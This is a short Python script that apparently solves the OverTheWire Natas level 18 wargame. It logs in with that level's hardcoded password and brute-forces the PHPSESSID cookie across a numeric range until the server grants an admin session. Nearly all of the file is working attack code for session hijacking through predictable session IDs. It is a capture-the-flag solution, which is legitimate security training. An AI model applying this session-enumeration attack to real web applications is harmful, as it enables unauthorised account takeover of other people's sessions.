#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

usn = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
#url = "http://%s.natas.labs.overthewire.org/index-source.html" % usn
url = "http://%s.natas.labs.overthewire.org/" % usn
login = (usn, password)
session = requests.Session()

#connection = session.get(url, auth = login)


for sess_id in range(1, 640):

  connection = session.post(url,  data ={ "username" : "tylerptl", "password" : "pass"}, cookies = {"PHPSESSID" : str(sess_id)}, auth = login)

  page_content = connection.text 
  if ("You are an admin" in page_content):
    print("Welcome to zombocom")
    print(page_content)
    break
  else:
      print( "Attempting new adminID: " , sess_id)
# session.cookies will print out the random number assigned by createID()
print(session.cookies)